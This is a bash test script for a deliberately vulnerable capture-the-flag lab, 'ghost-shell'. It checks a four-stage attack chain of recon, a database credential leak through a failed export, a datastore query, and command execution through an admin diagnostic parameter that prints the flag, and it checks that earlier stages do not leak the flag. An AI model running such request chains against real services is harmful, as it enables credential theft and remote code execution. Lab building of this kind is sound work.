#!/usr/bin/env bash
# w10 ghost-shell :: self-verifying probe.
#
#   ./probe.sh                        # http://localhost:30010
#   ./probe.sh http://host:port
#
# Asserts the WHOLE chain, and separately asserts that the intermediate stages
# do NOT hand over the flag on their own. If recon or the cred leak alone
# produced the flag, the lab would be a one-shot and the RCE stage pointless.
#
# The flag lives in the console container's environment, so the only path to it
# is code execution there. That is what the last checks prove.
set -uo pipefail

BASE="${1:-http://localhost:30010}"
fail=0

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

refute() { # refute <label> <forbidden-substring> <actual>
  if [[ "$3" != *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       must NOT contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

printf '[*] target %s\n' "$BASE"

# --- the edge is up and dispatching -----------------------------------------
check "edge health"            '"up":true'          "$(curl -s "$BASE/edge/health")"
check "landing page serves"    'GHOST SHELL'        "$(curl -s "$BASE/")"

# --- stage 1: recon ----------------------------------------------------------
STATUS="$(curl -s "$BASE/api/status")"
check "recon names the datastore" 'w0b-w10-db' "$STATUS"
# recon alone must not leak the flag
refute "recon does not leak the flag" 'hex4b0t{' "$STATUS"

# --- stage 2: credential leak ------------------------------------------------
LEAK="$(curl -s "$BASE/api/export?table=definitely_not_a_table")"
check "failed export leaks the dsn"    'postgresql://'      "$LEAK"
check "leaked dsn carries credentials" 'ghost_ops_2024'     "$LEAK"
refute "cred leak alone is not enough" 'hex4b0t{'            "$LEAK"

# --- stage 3: the datastore is reachable through the app ---------------------
Q="$(curl -s "$BASE/api/ops/query?q=SELECT%20count(*)%20FROM%20audit")"
check "ops query reaches the datastore" '"result":"2"' "$Q"
refute "datastore read alone is not enough" 'hex4b0t{' "$Q"

# --- stage 4: RCE ------------------------------------------------------------
RCE="$(curl -s "$BASE/admin/diag?probe=id")"
check "diag executes commands" 'uid=' "$RCE"

FLAG="$(curl -s "$BASE/admin/diag?probe=printenv%20W0B_FLAG")"
check "RCE yields the flag" 'hex4b0t{' "$FLAG"

# --- the datastore must NOT be published to the host -------------------------
if curl -s -m 3 -o /dev/null "http://localhost:5432/" 2>/dev/null; then
  printf '  FAIL datastore reachable from the host directly (no host port expected)\n'
  fail=1
else
  printf '  ok   datastore has no host port (the console is the only route)\n'
fi

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w10 chain intact: recon -> leak -> reach -> RCE -> flag\n'
else
  printf '\n[!] w10 probe FAILED\n'
fi
exit $fail
